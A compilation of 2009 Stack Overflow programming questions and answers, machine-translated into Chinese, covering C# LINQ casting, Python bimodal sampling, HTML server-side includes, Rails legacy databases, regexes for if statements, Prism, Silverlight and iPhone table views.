编辑：感谢大家的支持和建议，我已将几乎所有内容都输入到待办事项中以实施。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T17:49:30.360

为什么不把`ID`和`Name`放入基类？那么你不需要任何向下转换。

但是，如果您*确实*需要强制转换，[`Cast`](http://msdn.microsoft.com/en-us/library/bb341406.aspx)and[`OfType`](http://msdn.microsoft.com/en-us/library/bb360913.aspx)运算符可能会对您有所帮助。每个都将一个序列转换为指定类型的序列：`Cast`假设每个元素*都是*正确的类型（如果不是这种情况则抛出异常）；`OfType`工作起来更像 C#`as`运算符，只返回恰好是正确类型的元素并忽略其他元素。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-16T17:56:48.127

To elaborate on Jon's answer, `OfType` is almost certainly the correct operator if you aren't willing to put these fields into your base class. For example:

```
foreach(var s in processedFiles.OfType<Sample2>())
    if(s.ID == ID && s.Name == "Thing I'm looking for")
        // whatever

foreach(var s in processedFiles.OfType<Sample1>())
    if(s.ID == ID && s.Name == "Some other thing")
        // and so on 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T17:55:59.143

有趣的问题。除了 Jon Skeet 的（比这个选项更好）注意之外，您可以尝试更手动的替代方案。添加一个附加属性，其中包含对象类型的标识符。

```
public abstract class LabFileBase
{
    public string LabFileObjectType { get; }
    public string ID {get;set;}
    public string Name {get;set;}
}

public class Sample1 : LabFileBase
{    
    public string LabFileObjectType { get { return "Sample1"; } }
    //..
}

public class Sample2 : LabFileBase
{    
    public string LabFileObjectType { get { return "Sample2"; } }
    //..
} 
```

然后您也可以查询该属性：

```
var result = processedFiles.Select(s => s.ID == SomeID && s.Name == SomeName && s.LabFileObjectType == "Sample2"); 
```

# python - C 或 Python 中的双峰分布

> ID：651421
> 
> 赞同：2
> 
> 时间：2009-03-16T17:42:32.687
> 
> 标签：python, c, random

根据 C 或 Python 中的双峰分布生成随机值的最简单方法是什么？

我可以实现类似 Ziggurat 算法或 Box-Muller 变换之类的东西，但如果有现成的库或我不知道的更简单的算法，那就更好了。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-16T17:49:31.687

您不只是选择两种模态分布中的任何一种吗？

[http://docs.python.org/library/random.html#random.triangular](http://docs.python.org/library/random.html#random.triangular)

听起来您只需在两组参数之间来回切换即可调用三角形。

```
def bimodal( low1, high1, mode1, low2, high2, mode2 ):
    toss = random.choice( (1, 2) )
    if toss == 1:
        return random.triangular( low1, high1, mode1 ) 
    else:
        return random.triangular( low2, high2, mode2 ) 
```

这可能会做你需要的一切。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T17:53:19.417

总是有老式的直接[接受-拒绝算法](http://en.wikipedia.org/wiki/Rejection_sampling)。如果它对 Johnny von Neumann 来说已经足够好了，那么它对你来说应该足够好了 ;-)。

# html - 母版页或模板

> ID：651435
> 
> 赞同：1
> 
> 时间：2009-03-16T17:43:57.050
> 
> 标签：html, web

我目前正在创建一个纯 HTML 的网站（没有框架，只有纯 HTML）。
它有很多具有共同导航的页面。

有没有办法拥有像 ASP.Net 的母版页或其他框架提供的模板之类的功能。

我不太愿意使用框架集。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T17:48:31.160

如果您的网络服务器允许您使用 SSI（服务器端包含），您可以将常见的 HTML 文件包含到您的各个页面中，以允许您重新使用某些导航和布局页面。

前任。

```
<!--#include file="header.html"-->
<b>The main content here</b>
This content is in the main body
<!--#include file="footer.html"--> 
```

根据服务器配置，您可能需要将文件的扩展名更改为 .shtm 或 .shtml 以便处理 SSI 命令。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T17:48:00.020

如果您使用的是 Apache，您可以使用 SSI 服务器端包括[http://httpd.apache.org/docs/1.3/howto/ssi.html](http://httpd.apache.org/docs/1.3/howto/ssi.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T17:49:18.520

看看 Dreamweavers 模板机制。我已经将它大量用于静态网站，并且它可以工作。将导航复制/粘贴到多个页面不是一个好主意。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-16T17:52:49.370

对于这样的网站，我使用[Sleepy](http://code.google.com/p/sleepy-django/)和 Python 和 Django。

> Sleepy，允许您通过将 Django 模板呈现为 HTML 来创建静态站点。

所以基本上，我仍然可以在我的项目中使用模板，而 Sleepy 会吐出 HTML。

不过，您必须学习 Django。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T17:46:47.823

我相信在 HTML 中执行此操作的唯一方法是将通用代码手动复制/粘贴到每个页面上。如果您使用任何类型的框架或服务器端代码，那么您可以使用它来处理它，但是对于直接的客户端 HTML，它是不可行的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T18:34:51.687

您可以使用 javascript/ajax 来包含文件。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-06-04T18:58:24.183

您可以使用编辑器提供的模板机制，例如在 Dreamweaver 甚至 TextMate 中。或者，您可以使用像[jekyll](http://www.oiledmachine.com/posts/2008/12/27/overview-of-jekyll--a-static-site-generator-written-in-ruby.html)这样的生成器（它由 Ruby 驱动，但我相信还有其他的）。

# ruby-on-rails - Rails 与非 Rails 数据库设计

> ID：651436
> 
> 赞同：3
> 
> 时间：2009-03-16T17:44:36.723
> 
> 标签：ruby-on-rails, ruby, database

完成新手研究 Rails。Rails 可以与不符合 Rails 默认命名和设计约定的只读模式一起使用吗？

例如，我的数据库架构具有使用字符串列作为唯一主键的基表。例如，名为 Jobs 的基表可能具有定义为 Jobs.Job 的唯一主键，并且值可能是“D01234”。现在，Jobs 的子实体可能是 CostCodes，其中唯一的主键是 CostCodes.Job（返回 Jobs 表的 FK 引用）和 CostCodes.CostCode（本地字符串列）的聚合。

对于它的价值......这是股票 Sage Timberline Office 数据库。

任何指针？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-16T19:48:56.360

是的，这是可以做到的。

Dave Thomas 有[一篇博客文章](http://pragdave.pragprog.com/pragdave/2006/01/sharing_externa.html)描述了一些必要的东西：指令，例如

```
set_table_name  "orders"
set_primary_key "o_id" 
```

在您的 ActiveRecord 模型定义中。

更多参考资料：

*   [ActiveRecord::Base api](http://api.rubyonrails.org/classes/ActiveRecord/Base.html)
*   [铁路维基](http://wiki.rubyonrails.org/howtos/db-relationships/table-aliasing)

谷歌搜索“activerecord legacy database”应该会得到更多。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-16T19:44:17.293

您将要为您的特定表打开模型并设置以下内容：

```
set_table_name 'user'
set_primary_key 'user_name' 
```

如果您正在管理关系，您可能需要明确指定连接表：

```
has_and_belongs_to_many :page, :join_table => 'user_page' 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T19:49:57.093

是的，ActiveRecord（默认 ORM）将允许您自定义您需要自定义的有关您正在访问的数据库的任何内容 - 有关详细信息，请参阅 Mike 和 Robotsu 的答案。

您还可以将 ActiveRecord 替换为另一个更灵活的 ORM。[DataMapper](http://datamapper.org)是一个插入式替代品，似乎有一些吸引力。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-17T05:11:26.853

其他答案已经涵盖了您的问题，但是所有这些 ActiveRecord 问题的一个很好的资源是 Apress 的 Pro ActiveRecord，它真的很好，你应该查一下。

# asp.net - Ajax 工具包标签面板错误

> ID：651437
> 
> 赞同：0
> 
> 时间：2009-03-16T17:44:43.540
> 
> 标签：asp.net, tabpanel

我正在使用 Visual Studio 2005 和 ajaxtoolkit 2.0 。

我在网页中使用 ajaxtoolkit Tabpanel 控件。我有一个用于添加数据的选项卡，并且我动态地构建了其他用于加载数据 (DB) 和更新的选项卡。

添加数据的选项卡不会给我任何问题，因为控件从一开始就放在页面中。但是动态选项卡的控件不起作用，不会在回发中检索数据。选项卡是在 Init 事件中创建的，这是第二个问题，因为我需要视图状态数据来制作更新选项卡。我知道必须在初始化事件中创建控件，所以我做到了，但问题仍然存在。

我认为是一个错误控制。

任何人都有动态标签的解决方案吗？

谢谢你，对不起，我的英语。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2010-07-05T01:52:26.040

您需要将标签创建放在 on_load 中（即使在回发时）

# mysql - 数据库设计，如何设置表

> ID：651450
> 
> 赞同：0
> 
> 时间：2009-03-16T17:47:53.360
> 
> 标签：mysql, database-design

我有一个简单的电子商务类型的网站，其中的用户将拥有这些用户的帐户、订单和联系/账单信息。我只是想从效率和逻辑的角度了解设置这些表的最佳方法。到目前为止，我基本上有两个不同的实体，用户和订单。用户将拥有姓名和密码等基本帐户信息，订单将包含有关特定订单的所有信息。

我的问题是，我应该在 User 表中包含所有联系/计费信息还是制作两个单独的表来包含联系和计费信息？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T18:02:07.100

您可能需要多考虑一下：

用户有联系方式和帐单地址，那么送货地址和其他地址呢？是否可以有来自一家公司的两个用户，每个用户的联系地址不同，但账单地址相同？一个用户是否可以有多个账单地址供他们在订购时选择？

然后，当涉及到您的订单时，如果客户更新了他的帐单地址，然后您从帐单地址更改之前提取了一个订单，会发生什么情况。旧订单上的账单地址应该是新订单还是订单时的账单地址？

如果问题像您描述的那样简单，并且用户只有联系人和帐单地址，并且没有其他“假设”，那么将这些地址放在用户表中是有意义的。但是，根据我在该领域的有限经验，您很可能会发现地址本身必须是实体，与特定用户分开。实际上，您可能将“用户”视为“联系地址”。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T17:59:35.267

联系方式、账单和运输（如果需要）信息在逻辑上是分开的。从纯粹规范化的角度来看，地址应该是一个单独的实体，并且您应该在客户和地址之间建立关系。从规范化的角度来看，最“正确”的方法是在客户和地址之间建立多对多的关系，并使用类型来区分帐单、联系方式和送货地址（假设每个地址可以有多个） .

您还需要考虑您的产品。一种常见的方法是有一个 Order 表，在它下面有一个 Lines 表（从 Order 到 Lines 的一对多关系）。每行将引用一个产品，包括数量、价格和任何其他相关信息（折扣等）。简单的定价可以通过产品表中的价格条目进行调整；显然，更复杂的定价策略将需要更多的努力。

在任何人说我走得太远之前：“简单”的网站经常发展。事先正确设置数据模型将为您节省数不清的痛苦。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T17:54:34.937

我认为联系信息应该在用户表中，没有必要将其规范化为专用的邮政编码表等。它与账单信息相同，如果它们可能是信用卡号码或类似的东西。如果计费信息意味着某个计划，那么我会将不同的可用计划放入一个单独的表中，并通过外键“链接”它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-16T17:56:26.087

如果您将同时查找联系信息*和*帐单信息，并且您很少只使用其中一个，那么将它们分成不同的表是没有用的，因为无论如何您都会加入它们。

另一方面，如果您经常只查找联系人或账单中的一个，那么性能可能会从分离中受益。

我个人不会将它们分开，因为我无法预见很多时候我都不想要它们。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T18:04:14.273

您是否会遇到“用户”可能有多个联系人的情况？

我有数据库设计，其中“客户”可能有多个联系人，在这种情况下，您应该为联系人维护一个单独的表。否则，正如其他人所说，您可以将用户及其联系信息保存在同一个表中，因为您将始终一起查询他们。

# regex - 用于识别 If 语句的正则表达式

> ID：651455
> 
> 赞同：7
> 
> 时间：2009-03-16T17:49:27.100
> 
> 标签：regex

我正在尝试编写一个正则表达式来识别一个 if 语句。我遇到的唯一问题是在括号中带有括号的语句捕获它。例如：

```
if (condition_function(params)) {
     statements;
} 
```

我捕获除这些之外的所有 if 语句的表达式是：

```
 if\s*\(([^\(\)]|\s)*\)\s*{(.|\s)*?} 
```

有谁知道怎么写？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-03-16T17:51:05.177

这对于正则表达式是不可能的，因为正则表达式只能匹配正则语言，而您尝试解析的语言是上下文无关的而*不是*正则的（感谢 dirkgently 和 dmckee）。

看看[WP: 形式语言理论](http://en.wikipedia.org/wiki/Formal_language_theory)是你感兴趣的...

顺便提一句。您甚至无法检查仅由括号组成的表达式是否正确（`[[][]]`正确但`[]][`不正确），这是您上面给出的表达式的“子问题”。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-03-16T18:34:31.563

我认为这可能有效。如果有人看到我没有看到的东西，比如它不起作用的原因，请回复。

```
if\s*\(((?:[^\(\)]|\((?1)\))*+)\)\s*{((?:[^{}]|{(?2)})*+)} 
```

现在应该遇到的唯一问题是 if 语句中是否有 if 语句。

我已经在每个我能想到的可能会破坏它的有效 if 语句上对此进行了测试，唯一不起作用的是包含带有不匹配括号的字符串的语句。

更新：我发现上面的正则表达式有一个错误。它不会捕获在其条件或语句部分中包含带有不匹配括号的字符串的 if 语句。像下面的例子：

```
if (var1 == "("){
    echo "{";
} 
```

然而，这是一个有效的 if 语句。解决方案：

```
if\s*\(((?:(?:(?:"(?:(?:\\")|[^"])*")|(?:'(?:(?:\\')|[^'])*'))|[^\(\)]|\((?1)\))*+)\)\s*{((?:(?:(?:"(?:(?:\\")|[^"])*")|(?:'(?:(?:\\')|[^'])*'))|[^{}]|{(?2)})*+)}\s* 
```

此正则表达式捕获所有 if 语句，甚至包含带有不匹配括号的字符串的语句。

更新：我现在拥有它，以便捕获附加到 if 语句的 else 和 else if 语句。唯一的问题是它返回的捕获组是 if 语句中的最后一个 else 和最后一个 else if。希望我也能弄清楚如何解决这个问题。

```
if\s*\(((?:(?:(?:"(?:(?:\\")|[^"])*")|(?:'(?:(?:\\')|[^'])*'))|[^\(\)]|\((?1)\))*+)\)\s*{((?:(?:(?:"(?:(?:\\")|[^"])*")|(?:'(?:(?:\\')|[^'])*'))|[^{}]|{(?2)})*+)}\s*(?:(?:else\s*{((?:(?:(?:"(?:(?:\\")|[^"])*")|(?:'(?:(?:\\')|[^'])*'))|[^{}]|{(?3)})*+)}\s*)|(?:else\s*if\s*\(((?:(?:(?:"(?:(?:\\")|[^"])*")|(?:'(?:(?:\\')|[^'])*'))|[^\(\)]|\((?4)\))*+)\)\s*{((?:(?:(?:"(?:(?:\\")|[^"])*")|(?:'(?:(?:\\')|[^'])*'))|[^{}]|{(?5)})*+)}\s*))*; 
```

如果你想测试一下，这里有一个很棒的网站： http: [//gskinner.com/RegExr/](http://gskinner.com/RegExr/)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-03-16T17:59:33.817

您正在尝试编写正则表达式来解析非常规语言？那永远飞不起来。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-03-16T19:14:13.980

你需要用图灵完备的语言编写代码。有一些工具可以自动为您构建代码，例如[Flex](http://en.wikipedia.org/wiki/Flex_lexical_analyser)。但是，如果您只是遇到一个简单的问题，那么自己编写一些简单的解析代码可能是最简单的。下面是一些示例 C# 代码，可以帮助您入门。

```
public void TestIf()
    {
      var s = @"if (condition_function(params)) {
     statements;
       }";
      var ifRegex = @"if *\(.*\) *{.*}";
      if (Regex.IsMatch(s, ifRegex, RegexOptions.Singleline))
      {
        var firstParens = s.IndexOf('(');
        if (firstParens != -1)
        {
          var conditionPart = s.Skip(firstParens + 1);
          int stack = 1;
          int lastParens = -1; 
          while(stack > 0)
          {
            for (int i = 0; i < conditionPart.Count(); i++)
            {
              var c = conditionPart.ElementAt(i);
              if (c == '(')
              {
                stack++;
              }
              if (c == ')')
              {
                stack--;
              }
              if (stack == 0)
              {
                lastParens = i;
                break; 
              }
            }
          }
          if (lastParens != -1)
          {
            var condition = conditionPart.Take(lastParens);
            Console.WriteLine(new string(condition.ToArray()));
          }
        }
      }
    } 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T18:13:41.177

```
r = /\bif\s*\(/

txt = <<TXT
if(test)
if (test)
if  (xyz)
; if
print x if(true)
TXT

p txt.scan(r) 
```

if(something).. something 可以是任何东西.. 如果里面有一个带括号结尾的字符串，并且你想正确处理匹配的括号对，那么你很快就会得到一个大的正则表达式。

另外，您要匹配什么语言？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T17:55:37.087

如果您必须使用正则表达式，即使它永远不会捕获*所有*情况，那么这个更好：

```
if\s*\(((?!\s*\{).+)\)\s*\{(.|\s)*?\} 
```

它使用[积极的前瞻](http://www.regular-expressions.info/lookaround.html)( `(?!\s*\{).`) 确保在结束之前捕获所有内容`)`（除非您的条件语句中包含“ `{`”！这就是正则表达式无法帮助您的地方）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-16T18:01:49.240

快速拍摄...

```
if\s*?\(.*?)\s*?(({?\s*?(.*?;)+\s*?})|(.*?;)) 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2015-12-29T14:12:12.873

修改的正则表达式 (Koukaakiva)，不带括号查找 - [https://regex101.com/r/fE6hA5/1](https://regex101.com/r/fE6hA5/1) 并将名称添加到模式

# silverlight - Prism 2 SL：单击按钮时从区域中删除视图

> ID：651460
> 
> 赞同：1
> 
> 时间：2009-03-16T17:49:59.313
> 
> 标签：silverlight, mvvm, prism

我是 Prism 的新手，我正在尝试确定在 Prism 2 应用程序中停用视图的最佳实践——当用户单击视图上的按钮时，我想停用视图。单击按钮时视图正在执行命令。

视图模型正在接收命令，但视图模型没有对 regionmanager 的引用。

视图模型应该知道区域管理器吗？即使视图模型有对它的引用，它也需要将视图实例传递给包含区域的 deactive 方法。

我正在为应用程序使用 MVVM 模式。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T18:16:14.820

我将在这里冒险并假设您正在为您的区域使用项目控件或类似的东西，因为这是“删除视图的按钮”的最明显用法。

在这种情况下，您应该有一个控制器（或任何您想称呼它的名称，但 Prism 团队似乎使用这种名称来承担这种责任）负责管理活动的 ViewModel，并且您可以显示您的视图使用 DataTemplates，或者在添加新实例时手动创建/添加/激活新视图。您的情况似乎是第二个，控制器应该负责管理视图。您的视图模型应该通过依赖注入获得对该控制器的引用，并要求它从活动模型/视图池中删除它。

Controller 本身接收到 IRegionManager 并找到它负责的 Region。

我希望这是有道理的，如果没有，请发表评论。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-26T07:42:17.377

`EventAggregator`在您的情况下（需要自行卸载的控件）可能是矫枉过正，因为简单`IRegionManager`地注入该控件视图模型构造函数

```
ctor (IRegionManager regionManager)
{
    this.RegionManager = regionManager
} 
```

然后像这样

```
this.regionManager.Regions[regionName].Remove(this.View); 
```

应该做你要求的事情。

`IRegionManager`是可模拟的接口，可以轻松测试，它只是一种抽象，不会将您与实现耦合并启用 IoC。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T11:35:55.340

我也挂在这里了。我发现，因为 RegionManager 负责它包含的区域，所以我最终会在我的 RegionManager 和我想要管理的区域之间实现紧密耦合。

从外部管理这些区域（比如从主应用程序菜单）是一项复杂的工作，因此我们放弃了 PRISM 框架，并基于在我们的特定场景中使用的复合应用程序指导元素编写了我们自己的代码。

# c# - 显式声明默认字段值是一种不好的做法吗？

> ID：651462
> 
> 赞同：5
> 
> 时间：2009-03-16T17:50:34.180
> 
> 标签：c#, resharper

将问题复制到：

> [我应该总是/永远/从不将对象字段初始化为默认值吗？](https://stackoverflow.com/questions/636102/should-i-always-ever-never-initialize-object-fields-to-default-values)

环境：Visual Studio 2008 w/Resharper 4.1 w/32bit .NET Framework 3.5

Resharper 报告说

> 默认值初始化字段是多余的

![替代文字](https://farm4.static.flickr.com/3540/3360595348_023c27dd5e_o.png)

明确声明默认**字段值是一种不好的做法吗？**
我发现明确声明默认值更具可读性。

顺便说一句，这不是这个问题的重复。OOP 中的 [默认参数是不好的做法吗？](https://stackoverflow.com/questions/624057/are-default-parameters-bad-practice-in-oop)

***[更新]***对于那些想知道在哪里更改 Resharper 4.1 设置以将警告更改为提示/建议的人；更改以下设置 ![替代文字](https://farm4.static.flickr.com/3657/3359827611_602713a927.jpg)

将更改 Visual Studio 2008
![替代文字](https://farm4.static.flickr.com/3458/3359827603_a7da59ce1d_o.png)

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-03-16T17:52:16.377

这是多余的，但我会保持一致。如果您总是在初始化字段，请保持这种方式，无论类型如何。此外，正如您在评论中指出的那样，需要考虑某些类型的默认值会分散注意力，因此首先进行初始化的另一个原因。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-03-16T17:55:44.823

如果您发现这样更具可读性，那很好。我*认为*它不会影响 JITted 代码——即使它影响了，对性能的影响也绝对是微乎其微的。

如果 ReSharper 在遇到此警告时让您烦恼，只需将其配置为不要将其视为问题。我在这台机器上没有 ReSharper，但我认为找到相关选项相当容易 - 如果你不能，请告诉我，当我在正确的机器上时我会寻找它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-19T12:56:30.813

初始化字段可能意味着性能损失：

*   [http://www.codeproject.com/KB/dotnet/DontInitializeVariables.aspx](http://www.codeproject.com/KB/dotnet/DontInitializeVariables.aspx)
*   [http://blog.codinghorror.com/for-best-results-dont-initialize-variables/](http://blog.codinghorror.com/for-best-results-dont-initialize-variables/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-17T01:34:01.570

一般答案就像其他人所说的那样，如果它对您和您的团队更有意义，那么将 Reshaper 设置重置为提示。C# 会将所有值初始化为其默认值（数字`null`为 0，引用类型为 0），这等效于 .NET 2.0 默认运算符：

```
int i = default(int); 
```

**编辑**：您不会在代码中使用上述内容。它相当于'i = 0'，但是它的可读性要差得多。我只是用它来说明关于未分配变量使用其*默认*值初始化的观点。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T18:00:33.237

**我会说不**明确定义该字段是不好的做法。不应将未初始化的字段假定为默认值，而应将其假定为“null”。在这种情况下，您希望它显式为 0，因此您应该将其声明为 0。

Resharper 是一种非常严格的编码风格，你不应该盲目地听它，特别是如果它损害了你的代码的可读性。

此外，如果有人需要将其移植到不同的语言（默认值可能是未定义的，而不是“0”），那么它会导致未初始化的变量编译器错误，或者更糟糕的是，运行时错误。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T18:37:25.877

如果它完全喜欢 Java（在手机上......很难查找），那么显式初始化它意味着您不能将该字段标记为 final（在 C# 中可能是 const），这使得正确创建不可变类变得更加困难。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-17T20:02:50.167

我想这是一个品味问题，但正如我在其他地方所说，我不喜欢冗余。

省略字段的初始化程序可能意味着编码人员知道它将被初始化为默认值，或者他知道它不会被初始化并且不在乎，或者他没有考虑它并且他的代码只是发生了去工作。后两者将是，容我们说，“教育机会”。

另一方面，将字段初始化为其默认值对我来说意味着编码人员不了解平台，或者不信任它。

如果从不使用默认值怎么办？从所有构造函数初始化字段的情况，或者在读取之前始终设置字段的情况？在这些情况下，设置为默认值并不表示意图 - 只是表示遵循没有意义的规则。

# silverlight - Silverlight 2：希望可变数量的项目占据固定宽度

> ID：651464
> 
> 赞同：0
> 
> 时间：2009-03-16T17:51:12.213
> 
> 标签：silverlight, xaml, itemscontrol, stackpanel

堆栈面板不合作。我们有一个固定的宽度，以及从左到右排列的可变数量的项目。

我们有一个项目控件，它使用堆栈面板来布置它们：

```
<ItemsControl x:Name="testItems"
              HorizontalAlignment="Left"
              VerticalAlignment="Top">
    <ItemsControl.ItemsPanel>
            <ItemsPanelTemplate>
            <StackPanel Orientation="Horizontal" />
            </ItemsPanelTemplate>
        </ItemsControl.ItemsPanel>
        <ItemsControl.ItemTemplate>
            <DataTemplate>
                <Stacktest:ItemControl />
            </DataTemplate>
        </ItemsControl.ItemTemplate>
    </ItemsControl> 
```

但这并不能正确调整项目的大小。无论有多少可用空间，它们的大小始终相同。如果项目太多，它们会在右侧被切断，而不是调整大小以使它们都适合。知道如何做到这一点吗？如果项目的数量是恒定的，我会使用网格，但事实并非如此。它通常是 1-4 项。

如果 ItemsPanelTemplate 可以是具有可变列数的网格，那就太好了。但我不知道在 ItemsPanelTemplate 中是否可能（或具有相同结果的东西）。

答案是编写一个特殊的面板子类，为包含的项目分配相等的宽度吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T18:05:40.290

我认为你想要的是 UniformGrid。您可以指示它只有一行，并且应该将里面的所有项目布局为具有相同的宽度。这可能不是您正在寻找的，但这是我能想到的最接近的。

我不确定 Silverlight Toolkit 是否提供这样的组件，但我已经看到了展示如何构建一个组件的帖子。

[例如， Jeff Wilcox 的博客](http://www.jeff.wilcox.name/2009/01/uniform-grid/)就有一个。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T18:29:33.680

我可能有点老派，但我喜欢自己做这种事情。您可以在后端编写一些代码以在空间中放置动态数量的项目（使用网格），并使它们具有动态宽度并均匀分布。

这可能会按照您想要的方式工作，并且可以调整。

# c# - Form子类的子类显示为空

> ID：651465
> 
> 赞同：1
> 
> 时间：2009-03-16T17:51:13.057
> 
> 标签：c#, forms, designer, subclass

我正在编写一个应用程序，其中我有不确定的数量`Forms`需要一定的弹出功能（类似于 MSN，屏幕右下角的一个小窗口）。我写了第一个表格，然后想我可以复制文件来制作一个新的。到目前为止，一切都很好。过了一会儿，我意识到我可以对 Form 进行子类化，编写弹出代码，然后对新`PopupForm`类进行子类化以制作其他表单，以简化对弹出代码的重写。所以我这样做了，但现在我的表单没有在设计器中正确显示！它们完全是白色的（没有背景图像或控件），我无法将新控件拖到上面。我试着把

```
[Designer("System.Windows.Forms.Design.FormDocumentDesigner, System.Design, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", typeof(IRootDesigner))]
[DesignerCategory("Form")] 
```

我的新表单上的类的属性`Form`，但它没有帮助。我需要能够更改表单的内容，而且我看不出有什么问题，所以这既烦人又令人困惑。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T17:55:57.910

如果您有多个构造函数，请确保调用调用基本无参数构造函数的那个​​，即包含`InitializeComponent`.

```
 class BaseForm
  {
       public BaseForm()
       {
            InitializeComponent();
       }

       // not good -> does not call InitializeComponent() or :this()
       public BaseForm(int someParameter)
       { }

       public BaseForm(string someParameter)
           : this() // good -> calls InitializeComponent()
       { }

       public BaseForm(byte b)
       {
           // good -> InitializeComponent is called explicitly 
           // (but call to this() above is preferred)
           InitializeComponent();
       }
  }

  class DerivedForm : BaseForm
  {
       public DerivedForm()
          : base(5) // not good -> calls the "bad" base constructor
       { }

       // good -> base() constructor is implicitly called
       public DerivedForm(double x)
       { }

       public DerivedForm(string someParam)
          : base(someParam)  // good -> BaseForm(string) will call InitializeComponent
       { }
  } 
```

# php - JavaScript/PHP cookie 序列化方法？

> ID：651466
> 
> 赞同：3
> 
> 时间：2009-03-16T17:51:16.817
> 
> 标签：php, javascript, serialization, cookies

我有一个表单，我想将它的值存储在 cookie 中，这样用户就不必每次访问都重新输入表单。（表单是一些用于过滤搜索结果的选择。）

我希望 cookie 序列化可以轻松地从 JavaScript 读取（显然是设置表单`onLoad`），但我也希望能够轻松地从 PHP 读取 cookie（以便我可以使用表单数据来过滤搜索结果）。

我将如何使用已`multiple="multiple"`设置为 cookie 的选择序列化表单并使其在 JavaScript 和 PHP 中易于阅读？

请不要宣扬验证，我在服务器端正确地做到了这一点。

如果我的问题有更聪明的解决方案，请告诉我。

顺便说一句：我在服务器上使用 CodeIgniter 和 Prototype/Scriptaculous JavaScript 库。

**解决方案：**为 JavaScript使用 Prototype ，并使用PHP 从 JSON 中获取 PHP 中的关联数组。[`Object.toJSON(`](http://www.prototypejs.org/api/object/tojson)[`Form.serialize(form, true))`](http://www.prototypejs.org/api/form/serialize)[`json_decode(string, bool)`](http://ca.php.net/json_decode)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T17:53:14.097

您可以使用已经以多种语言实现的[JSON 格式。](http://json.org/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T17:55:17.867

我会推荐 YAML。它基本上被设计为多种语言的通用序列化方法，包括 JavaScript 和 PHP。

从 YAML 网站：

> YAML 旨在满足 Perl、Python、Ruby、Tcl、PHP、Javascript 和 Java 的序列化需求。它还被设计为可在这些语言之间进行互操作。这意味着 Perl 生成的 YAML 序列化可以由 Python 处理。

这是关于该主题的站点点文章：

[http://www.sitepoint.com/blogs/2004/04/22/serializing-php-data-structures-for-javascript/](http://www.sitepoint.com/blogs/2004/04/22/serializing-php-data-structures-for-javascript/)

YAML 网站：

[http://www.yaml.org/](http://www.yaml.org/)

# iphone - 如何在同一个 iPhone 视图上拥有表格和其他元素？

> ID：651468
> 
> 赞同：4
> 
> 时间：2009-03-16T17:52:19.013
> 
> 标签：iphone, uitableview, subview

我正在尝试编写一个 iPhone 应用程序，其中一个主页有几个文本字段和一个 3 元素表，它们基本上用作选择器的导航按钮。

但是，我发现的所有教程示例都将表格视为接管整个视图的东西。

谁能指出表格只是视图一部分的示例？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T18:03:22.870

这里有两个不同的对象：UITableViewController（默认创建一个 UITableView 接管整个屏幕）和 UITableView。您想创建一个小于屏幕的 UITableView。使用您最简单的 UIViewController（不是 UITableViewController）Interface Builder 示例，将 UITableView 拖到视图上，将其大小调整为小于屏幕，并确保它具有委托和数据源连接。瞧！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-17T00:20:25.007

在 IB 中，从视图开始 - 将您喜欢的所有控件添加到此，并将表格拖动到您喜欢的任何大小。

然后在视图的视图控制器中，添加一个 IBOutlet 属性来保存你有药物的 UITableView，并将它在 IB 中链接到视图控制器文件的所有者。

现在，您还可以使您的视图控制器符合 UITableViewDelegate 和 UITableViewDataSource 协议，并在其中添加表委托方法（最简单的方法是从模板中创建一个新的 UITableViewController 子类，然后将这些方法拖到您的视图控制器中）。

不要忘记将 IB 中的 UITableView 委托和数据源引用链接回文件的所有者。

